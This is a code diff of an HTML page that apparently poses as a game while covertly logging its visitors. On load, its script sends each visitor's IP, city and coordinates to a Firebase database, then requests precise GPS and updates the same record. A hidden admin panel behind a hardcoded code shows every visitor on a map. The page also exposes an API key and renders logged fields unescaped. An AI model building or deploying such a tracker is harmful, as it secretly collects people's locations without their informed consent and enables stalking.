@@ -3,10 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>the game</title>
+    <title>Smart Admin Tracker</title>
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
     <style>
-        :root { --primary: #007bff; --bg: #0b0b0b; --card: #161616; --danger: #ff4444; }
+        :root { --primary: #007bff; --bg: #0b0b0b; --card: #161616; --danger: #ff4444; --success: #00ff88; }
         body { font-family: -apple-system, sans-serif; background: var(--bg); color: #fff; margin: 0; padding: 0; display: flex; flex-direction: column; height: 100vh; }
         
         #code-step { flex: 1; display: flex; flex-direction: column; justify-content: center; align-items: center; padding: 20px; text-align: center; }
@@ -24,11 +24,10 @@
         .log-item { background: var(--card); margin-bottom: 10px; padding: 15px; border-radius: 15px; border-left: 5px solid var(--primary); font-size: 13px; position: relative; }
         
         .coords-text { display: block; color: #aaa; font-family: monospace; margin-top: 5px; font-size: 11px; }
+        .delete-btn { position: absolute; top: 10px; right: 10px; background: var(--danger); color: white; border: none; padding: 5px 10px; border-radius: 8px; font-size: 11px; cursor: pointer; }
         
-        .delete-btn { position: absolute; top: 10px; right: 10px; background: var(--danger); color: white; border: none; padding: 5px 10px; border-radius: 8px; font-size: 11px; cursor: pointer; z-index: 10; }
-        
-        .method-tag { font-size: 9px; padding: 2px 6px; border-radius: 4px; background: #333; margin-right: 5px; }
-        .gps-tag { background: #00ff88; color: #000; }
+        .method-tag { font-size: 9px; padding: 2px 6px; border-radius: 4px; background: #333; margin-right: 5px; text-transform: uppercase; }
+        .gps-tag { background: var(--success); color: #000; font-weight: bold; }
 
         .hidden { display: none !important; }
     </style>
@@ -36,19 +35,19 @@
 <body>
 
     <div id="code-step">
-        <h1 style="color: var(--primary);">Admin Terminal</h1>
-        <input type="password" id="accessCode" placeholder="SECRET CODE">
-        <button onclick="checkCode()">LOGIN</button>
+        <h1 style="color: var(--primary);">System Access</h1>
+        <input type="password" id="accessCode" placeholder="СЕКРЕТНЫЙ КОД">
+        <button onclick="checkCode()">ВОЙТИ</button>
     </div>
 
     <div id="result-step">
         <div class="admin-header">
-            <b>Global Monitor</b>
-            <span id="count-label" style="font-size: 12px; opacity: 0.7;">0 users</span>
+            <b>Global Tracker</b>
+            <span id="count-label" style="font-size: 12px; opacity: 0.7;">0 записей</span>
         </div>
         <div class="mobile-layout">
             <div id="map-box"><div id="map"></div></div>
-            <div id="logs">Loading logs...</div>
+            <div id="logs">Загрузка данных...</div>
         </div>
     </div>
 
@@ -56,7 +55,7 @@
 
 <script type="module">
     import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
-    import { getDatabase, ref, push, onValue, remove, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
+    import { getDatabase, ref, push, onValue, remove, update, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
 
     const firebaseConfig = { 
         apiKey: "AIzaSyBHk4tRKFbr8qIkzI2WDOaf-JBfVmjDdRI", 
@@ -73,27 +72,46 @@
     const SECRET_CODE = "HTMLKODEYOURIP";
     let map, markers = {};
 
-    // 1. ТИХИЙ СБОР
-    async function track() {
+    // --- ЛОГИКА УМНОГО ОБНОВЛЕНИЯ ---
+    async function startSmartTracking() {
         try {
+            // 1. Сразу берем данные по IP
             const res = await fetch('https://ipapi.co/json/');
             const ipData = await res.json();
-            const send = (la, ln, m) => {
-                push(ref(db, 'visits'), {
-                    ip: ipData.ip || "Unknown", city: ipData.city || "Unknown",
-                    lat: la, lng: ln, method: m,
-                    time: new Date().toLocaleString('ru-RU'), timestamp: serverTimestamp()
-                });
-            };
-            send(ipData.latitude, ipData.longitude, "IP");
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition((p) => send(p.coords.latitude, p.coords.longitude, "GPS"), null, { enableHighAccuracy: true });
-            }
-        } catch (e) {}
-    }
-    track();
+            
+            // Создаем новую запись в базе и получаем её уникальный ID (Key)
+            const visitRef = push(ref(db, 'visits'));
+            const visitId = visitRef.key;
 
-    // 2. ВХОД
+            const initialData = {
+                ip: ipData.ip || "Unknown",
+                city: ipData.city || "Unknown",
+                lat: ipData.latitude,
+                lng: ipData.longitude,
+                method: "IP",
+                time: new Date().toLocaleString('ru-RU'),
+                timestamp: serverTimestamp()
+            };
+
+            // Сохраняем начальные данные (IP)
+            update(ref(db, `visits/${visitId}`), initialData);
+
+            // 2. Спрашиваем GPS. Если разрешит - ОБНОВЛЯЕМ ТУ ЖЕ ЗАПИСЬ
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition((p) => {
+                    update(ref(db, `visits/${visitId}`), {
+                        lat: p.coords.latitude,
+                        lng: p.coords.longitude,
+                        method: "GPS" // Меняем метку на GPS
+                    });
+                }, null, { enableHighAccuracy: true });
+            }
+        } catch (e) { console.error("Tracking error"); }
+    }
+
+    startSmartTracking();
+
+    // --- АДМИН ПАНЕЛЬ ---
     window.checkCode = function() {
         if (document.getElementById('accessCode').value === SECRET_CODE) {
             document.getElementById('code-step').classList.add('hidden');
@@ -108,12 +126,9 @@
         loadData();
     }
 
-    // 3. УДАЛЕНИЕ ИЗ БАЗЫ
     window.deleteRecord = function(e, key) {
-        e.stopPropagation(); // Чтобы не срабатывал зум карты при нажатии на кнопку
-        if(confirm("Удалить эту запись навсегда?")) {
-            remove(ref(db, `visits/${key}`));
-        }
+        e.stopPropagation();
+        if(confirm("Удалить запись?")) { remove(ref(db, `visits/${key}`)); }
     }
 
     function loadData() {
@@ -122,30 +137,29 @@
             const logBox = document.getElementById('logs');
             logBox.innerHTML = '';
             
-            // Удаляем старые маркеры с карты
             Object.values(markers).forEach(m => map.removeLayer(m));
             markers = {};
 
             if(!data) {
-                logBox.innerHTML = "Base is empty.";
-                document.getElementById('count-label').innerText = "0 users";
+                logBox.innerHTML = "<p style='text-align:center; color:#555;'>База пуста</p>";
+                document.getElementById('count-label').innerText = "0 записей";
                 return;
             }
 
             const entries = Object.entries(data);
-            document.getElementById('count-label').innerText = `${entries.length} users`;
+            document.getElementById('count-label').innerText = `${entries.length} записей`;
 
             entries.reverse().forEach(([key, user], i) => {
                 const isGPS = user.method === "GPS";
                 const div = document.createElement('div');
                 div.className = 'log-item';
                 div.innerHTML = `
-                    <button class="delete-btn" onclick="deleteRecord(event, '${key}')">Удалить</button>
+                    <button class="delete-btn" onclick="deleteRecord(event, '${key}')">×</button>
                     <span class="method-tag ${isGPS ? 'gps-tag' : ''}">${user.method}</span>
                     <b style="color:var(--primary)">#${entries.length - i}</b><br>
                     <b>IP:</b> ${user.ip}<br>
                     <b>City:</b> ${user.city}<br>
-                    <span class="coords-text">Lat: ${user.lat.toFixed(5)}, Lng: ${user.lng.toFixed(5)}</span>
+                    <span class="coords-text">📍 ${user.lat.toFixed(6)}, ${user.lng.toFixed(6)}</span>
                     <small style="color:#666">${user.time}</small>
                 `;
                 
@@ -153,11 +167,10 @@
                 logBox.appendChild(div);
 
                 markers[key] = L.marker([user.lat, user.lng]).addTo(map)
-                    .bindPopup(`User ${user.ip}`);
+                    .bindPopup(`User #${entries.length - i}<br>Method: ${user.method}`);
             });
         });
     }
 </script>
 </body>
 </html>
-
